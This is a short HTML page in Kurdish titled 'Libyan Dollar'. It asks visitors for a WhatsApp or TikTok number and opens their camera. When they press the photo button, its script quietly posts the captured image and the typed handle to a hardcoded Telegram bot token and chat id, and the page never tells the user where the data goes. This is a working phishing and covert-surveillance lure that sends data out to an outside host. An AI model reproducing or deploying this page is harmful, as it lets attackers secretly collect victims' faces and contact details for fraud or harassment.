<!DOCTYPE html>
<html lang="ku">
<head>
  <meta charset="UTF-8">
  <title>دۆلاری لیبی</title>
  <style>
    body { text-align: center; padding: 20px; font-family: sans-serif; background-color: #f2f2f2; }
    input, button { padding: 10px; margin: 10px; width: 80%; max-width: 300px; }
    video, canvas { margin-top: 20px; width: 90%; max-width: 300px; }
  </style>
</head>
<body>
  <h2>دۆلاری لیبی</h2>
  <input type="text" id="userInput" placeholder="ژمارەی واتسئاپ یان تیکتۆک...">
  <video id="video" autoplay></video><br>
  <button onclick="takePhoto()">وێنە بکەرەوە</button>
  <canvas id="canvas" style="display:none;"></canvas>
  <p id="status"></p>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => video.srcObject = stream)
      .catch(err => alert("ناتوانرێت کامێرا بکرێتەوە."));

    function takePhoto() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      const dataURL = canvas.toDataURL('image/png');
      const userText = document.getElementById('userInput').value;

      fetch("https://api.telegram.org/bot8090138544:AAEXliCUIK0ybDxquObmK6ZQ0fbhCTDGCto/sendPhoto", {
        method: "POST",
        body: (() => {
          const form = new FormData();
          form.append('chat_id', '7594104612');
          form.append('caption', "ناوی بەکارهێنەر: " + userText);
          form.append('photo', dataURItoBlob(dataURL), "photo.png");
          return form;
        })()
      }).then(() => {
        document.getElementById('status').innerText = "وێنە نێردرا!";
      }).catch(() => {
        document.getElementById('status').innerText = "هەڵەیەک ڕوویدا.";
      });
    }

    function dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: mimeString });
    }
  </script>
</body>
</html>
